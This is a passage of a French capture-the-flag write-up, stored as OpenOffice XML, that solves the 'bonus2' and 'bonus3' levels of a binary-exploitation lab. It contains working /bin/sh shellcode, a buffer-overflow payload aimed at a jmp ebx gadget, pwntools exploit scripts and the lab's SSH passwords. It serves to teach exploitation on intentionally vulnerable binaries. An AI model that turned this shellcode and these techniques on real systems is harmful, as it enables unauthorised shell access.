      <text:p text:style-name="P2"><text:span text:style-name="T12">Lors du crash, on remarque que le registre </text:span><text:span text:style-name="T3">ebx </text:span><text:span text:style-name="T12">pointe toujours sur le début d'un buffer qui contient nos données. Il s'agit en réalité de </text:span><text:span text:style-name="T3">buffer </text:span><text:span text:style-name="T12">de la fonction </text:span><text:span text:style-name="T3">main</text:span><text:span text:style-name="T12"> ; le registre </text:span><text:span text:style-name="T3">ebx </text:span><text:span text:style-name="T12">a été pointé sur </text:span><text:span text:style-name="T3">buffer</text:span><text:span text:style-name="T12"> à &lt;main+241&gt; (pour permettre de copier buffer dans arg), et n'a pas été bougé ensuite.</text:span></text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images27" text:anchor-type="paragraph" svg:x="0.949cm" svg:y="0.37cm" svg:width="15.099cm" svg:height="13.104cm" draw:z-index="26"><draw:image xlink:href="Pictures/20000007000044D600003BBE79DDBD64.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>Grâce à cela, on cherche un <text:span text:style-name="T3">gadget jmp ebx</text:span><text:span text:style-name="T12">, qu'on trouve dans la librairie partagée qu'utilise le programme (on fait exactement comme pour </text:span><text:span text:style-name="T3">level2</text:span><text:span text:style-name="T12">). On transfert la librairie partagée, on lance ROPgadget :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">ROPgadget --binary libc | grep "jmp ebx"</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">On trouve un gadget propre, on calcule son adresse réelle à partir de son offset et de la base adress dans </text:span><text:span text:style-name="T3">gdb </text:span><text:span text:style-name="T12">(encore une fois, voir le level2). On trouve que l'adresse du gadget à l'exécution du programme est :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">0xb7ea9ea4</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">On a désormais tout ce qu'il nous faut pour construire notre exploit. On place notre shellcode au tout début du buffer (début de argv[1] donc) ; on redirige le flux d'exécution vers un gadget </text:span><text:span text:style-name="T3">jmp ebx</text:span><text:span text:style-name="T12">, qui pointe sur notre shellcode, qui sera exécuté.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">&gt;&gt; <text:span text:style-name="T15">Exploitation manuelle :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P23"><text:span text:style-name="T12">env -i </text:span><text:span text:style-name="T23">LANG</text:span><text:span text:style-name="T25">=</text:span><text:span text:style-name="T21">"fi"</text:span><text:span text:style-name="T12"> ./bonus2 </text:span><text:span text:style-name="T27">$(</text:span><text:span text:style-name="T12">python -c </text:span><text:span text:style-name="T21">"print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A' * 40)"</text:span><text:span text:style-name="T27">)</text:span><text:span text:style-name="T12"> </text:span><text:span text:style-name="T27">$(</text:span><text:span text:style-name="T12">python -c </text:span><text:span text:style-name="T21">"print('B' * 18 + '\xa4\x9e\xea\xb7' + 'B' * 30)"</text:span><text:span text:style-name="T27">)</text:span><text:span text:style-name="T12"> </text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">&gt;&gt; <text:span text:style-name="T15">Script automatisé :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P21"><text:span text:style-name="T1">from</text:span> <text:span text:style-name="T9">pwn</text:span> <text:span text:style-name="T1">import</text:span> <text:span text:style-name="T4">*</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">argv_1</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">argv_1</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'A'</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">30</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">argv_2</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'B'</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">18</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">argv_2</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'\xa4\x9e\xea\xb7'</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">argv_2</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'B'</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">30</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><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bonus2"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">password=</text:span><text:span text:style-name="T11">"579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245"</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">s.process([</text:span><text:span text:style-name="T11">"/home/user/bonus2/./bonus2"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">argv_1,</text:span> <text:span text:style-name="T4">argv_2],</text:span> <text:span text:style-name="T4">env={</text:span><text:span text:style-name="T11">"LANG"</text:span><text:span text:style-name="T4">:</text:span> <text:span text:style-name="T11">"fi"</text:span><text:span text:style-name="T4">})</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P10">p.interactive()</text:p>
      <text:p text:style-name="P2">(Dans les deux cas, on oublie pas de définir la variable d'environnement pour permettre l'overflow complet !).</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Got flag<text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list1107390267568734867" text:style-name="L16">
        <text:list-item>
          <text:p text:style-name="P28"><text:soft-page-break/>Bonus 3</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">La reconstruction du code source donne ce résultat :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P15">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T8">main</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">argc,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">**argv)</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">FILE</text:span> <text:s text:c="3"/><text:span text:style-name="T4">*file;</text:span> <text:s text:c="23"/><text:span text:style-name="T6">// [esp+0x9c]</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">buffer[</text:span><text:span text:style-name="T10">132</text:span><text:span text:style-name="T4">];</text:span> <text:s text:c="19"/><text:span text:style-name="T6">// [esp+0x18]</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">file</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">fopen(</text:span><text:span text:style-name="T11">"/home/user/end/.pass"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T11">"r"</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">132</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">buffer[i++]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">'\0'</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(file</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">0</text:span> <text:span text:style-name="T4">||</text:span> <text:span text:style-name="T4">argc</text:span> <text:span text:style-name="T4">!=</text:span> <text:span text:style-name="T10">2</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">255</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">fread(buffer,</text:span> <text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T10">66</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">file);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">buffer[</text:span><text:span text:style-name="T10">65</text:span><text:span text:style-name="T4">]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">'\0'</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">buffer[atoi(argv[</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">])]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0x0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">fread(&amp;buffer[</text:span><text:span text:style-name="T10">66</text:span><text:span text:style-name="T4">],</text:span> <text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T10">65</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">file);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">fclose(file);</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(strcmp(buffer,</text:span> <text:span text:style-name="T4">argv[</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">])</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">execl(</text:span><text:span text:style-name="T11">"/bin/sh"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T11">"sh"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">else</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">puts(&amp;buffer[</text:span><text:span text:style-name="T10">66</text:span><text:span text:style-name="T4">]);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P4">Rien de compliqué dans le code désassemblé. J'ai cherché pendant quelques temps, et je suis tombé dans quelques rabbit holes avec ce niveau.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">La seule partie du programme sur laquelle on a un tant soit peu de contrôle est la ligne :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">buffer[atoi(argv[1])] = 0x0;</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On peut, grâce à cette ligne, placer un NULL BYTE dans la mémoire. J'ai essayé dans un premier temps d'utiliser cette fonctionnalité afin de réinitialiser le curseur de fichier afin que soit affiché le flag par le biais du <text:span text:style-name="T3">puts</text:span><text:span text:style-name="T12">, mais apparemment il n'y a pas une simple variable qui maîtrise ce curseur dans la structure FILE *.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">La solution était bien plus simple. Que se passe-t-il si on exécute le programme de cette façon :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">./bonus3 ""</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">On lui donne en </text:span><text:span text:style-name="T3">argv[1] </text:span><text:span text:style-name="T12">une chaîne entièrement vide, composée uniquement d'un '\0'. La fonction </text:span><text:soft-page-break/><text:span text:style-name="T3">atoi </text:span><text:span text:style-name="T12">interprète une chaîne vide en retournant </text:span><text:span text:style-name="T3">0</text:span><text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Ainsi, le premier caractère de "buffer" sera </text:span><text:span text:style-name="T3">\0</text:span><text:span text:style-name="T12"> ; </text:span><text:span text:style-name="T3">argv[1] </text:span><text:span text:style-name="T12">étant également une chaîne vide, la condition </text:span><text:span text:style-name="T14">strcmp(buffer, argv[1]) == 0</text:span><text:span text:style-name="T12"> sera remplie, ce qui nous donne une shell.</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">&gt;&gt; <text:span text:style-name="T15">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">./bonus3 ""</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">&gt;&gt; <text:span text:style-name="T15">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P21"><text:span text:style-name="T1">from</text:span> <text:span text:style-name="T9">pwn</text:span> <text:span text:style-name="T1">import</text:span> <text:span text:style-name="T4">*</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P22">### AUTOMATED EXPLOITATION ###</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">s</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">ssh(host=</text:span><text:span text:style-name="T11">'192.168.1.45'</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">port=</text:span><text:span text:style-name="T10">4242</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">user=</text:span><text:span text:style-name="T11">"bonus3"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">password=</text:span><text:span text:style-name="T11">"71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587"</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">s.process([</text:span><text:span text:style-name="T11">"/home/user/bonus3/./bonus3"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T11">""</text:span><text:span text:style-name="T4">])</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P10">p.interactive()</text:p>
      <text:p text:style-name="P2">Rien de bien compliqué ici, <text:span text:style-name="T3">got flag</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22M44S</meta:editing-duration>
    <meta:editing-cycles>21</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-09T13:02:52.11</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="27" meta:object-count="0" meta:page-count="27" meta:paragraph-count="492" meta:word-count="4906" meta:character-count="31980"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>